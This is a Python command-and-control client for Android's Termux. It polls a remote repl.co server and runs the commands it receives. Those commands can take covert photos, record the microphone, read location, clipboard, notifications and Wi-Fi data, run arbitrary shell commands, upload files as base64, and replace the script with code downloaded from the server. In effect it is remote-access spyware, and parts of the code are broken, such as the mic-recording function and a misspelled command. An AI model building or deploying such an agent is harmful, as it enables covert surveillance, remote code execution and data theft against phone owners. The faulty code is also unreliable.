from subprocess import check_output, CalledProcessError
import requests, json, uuid, os, _thread, base64, time

sh = lambda cmd: check_output(cmd.split(" ")).decode()
makeuid = lambda: str(uuid.uuid4())
myname = "$agentname"

def setup():
    if not os.getcwd().endswith("agent"):
        if not os.path.isdir("agent"):
            os.mkdir("agent")
        os.chdir("agent")
    for d in ['photos', 'recordings']:
        if not os.path.isdir(d):
            os.mkdir(d)

class Commands:
    def audio_info():
        return json.loads(sh("termux-audio-info"))
    def battery_status():
        return json.loads(sh("termux-battery-status"))
    def brightness(level):
        "level: screen brightness level between 0 and 255. default='auto'"
        return json.loads(sh("termix-brightness %s" % str(level)))
    def take_photo(camera_id=0):
        fn = makeuid()
        sh("termux-camera-photo -c %s photos/%s.png" % (str(camera_id), fn))
        return "photos/%s.png" % fn
    def clipboard_get():
        return sh("termux-clipboard-get")
    def clipboard_set(text):
        sh("termux-clipboard-set " + text)
    def fingerprint():
        return json.loads(sh("termux-fingerprint"))
    def infrared(frequency, pattern):
        "frequency: IR carrier frequency in Hertz\
        pattern: eg '20,50,10'"
        return json.loads(sh("termux-infrared-transmit -f %s '%s'" % (frequency, pattern)))
    def location():
        return json.loads(sh("termux-location"))
    def media(cmd):
        "commands: info, play <file>, pause, stop"
        return json.loads(sh("termux-media-player " + cmd))
    def record_mic(seconds):
        u = makeuid()
        sh("termux-microphone-record -l %i -f recordings/%s.mp3" % uid)
        return "recordings/%s.mp3" % u
    def notifications():
        return json.loads(sh("termux-notification-list"))
    def open_url(url):
        sh("termux-open-url '%s'" % url)
    def sensor(reads=1):
        return json.loads(sh("termux-sensor -s %i" % reads))
    def torch(x):
        "x: True or False"
        sh("termux-torch " + ("on" if x else "off"))
    def tts(text):
        sh("termux-tts-speak " + text)
    def volume_list():
        return json.loads(sh("termux-volume"))
    def set_volume(volume, channel="music"):
        sh("termux-volume %s %i" % (channel, volume))
    def wifi_info():
        return json.loads(sh("termux-wifi-connectioninfo"))
    def wifi_scan():
        return json.loads(sh("termux-wifi-scaninfo"))
    def shell(cmd):
        try:
            return sh(cmd)
        except CalledProcessError as e:
            return e.output
    def download(fn):
        return base64.b64encode(open(fn,"rb").read()).decode()
    def help():
        return [x for x in dir(Commands) if not x.startswith("_")]
    def update():
        newd = requests.get("https://command.marcusweinberger.repl.co/hooks/dla/" + myname).content.decode()
        with open(__file__, "w") as f:
            f.write(newd)
        

completed = []

url = "https://command.marcusweinberger.repl.co/agents"

def pinger():
    while True:
        try:
            requests.get(url + "/ping?name=" + myname)
        except:
            pass
_thread.start_new_thread(pinger, ())

def do_cmd(cmd, uid):
    print("running command", cmd)
    res = getattr(Commands, cmd['fn'])(*cmd.get("args",[]), **cmd.get("kwargs", {}))
    r = requests.post(url + "/submit", data={
        'name':myname,
        'uid':uid,
        'res':res,
    })
    print("sent res", r)

setup()
while True:
    try:
        commands = requests.get(url + "/commands?name=" + myname).json()
        for uid in commands:
            if not uid in completed:
                _thread.start_new_thread(do_cmd, (commands[uid], uid))
                globals()['completed'].append(uid)
    except:
        try:
            time.sleep(5)
        except KeyboardInterrupt:
            exit(0)